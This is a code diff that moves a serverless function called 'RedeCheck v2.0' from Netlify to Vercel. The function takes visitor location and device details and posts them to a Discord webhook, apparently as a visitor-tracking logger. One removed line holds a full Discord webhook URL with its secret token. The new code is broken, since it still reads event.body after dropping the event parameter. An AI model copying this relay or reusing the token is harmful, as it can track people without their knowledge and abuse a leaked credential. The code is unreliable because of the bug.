@@ -1,14 +1,18 @@
-// Função serverless que roda no Netlify
-exports.handler = async (event, context) => {
-  if (event.httpMethod !== 'POST') {
-    return {
-      statusCode: 405,
-      body: 'Method Not Allowed',
-    };
+export default async function handler(req, res) {
+  if (req.method !== "POST") {
+    return res.status(405).json({
+      error: "Method Not Allowed"
+    });
   }
 
   // Cole sua webhook aqui
-  const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK_URL || "https://discord.com/api/webhooks/1530746634646851594/MELPQ3WSCQBTKCtnEvHay1LirL6sHu4ats3XnDY3Twhx1w8Sw4JLJgPbVpzSQN_nrMaN";
+  const webhook = process.env.DISCORD_WEBHOOK_URL;
+
+    if (!webhook) {
+    return res.status(500).json({
+      error: "DISCORD_WEBHOOK_URL não configurada"
+    });
+  }
 
   try {
     const data = JSON.parse(event.body);
@@ -24,7 +28,7 @@ exports.handler = async (event, context) => {
         { name: "📍 Local", value: `${data.city}, ${data.region}\n${data.country}`, inline: false },
         { name: "📱 Device", value: `${data.deviceType} / ${data.os}`, inline: true }
       ],
-      footer: { text: "RedeCheck v2.0 – Netlify Serverless" },
+      footer: { text: "RedeCheck v2.0 – Vercel" },
       timestamp: new Date().toISOString()
     };
 
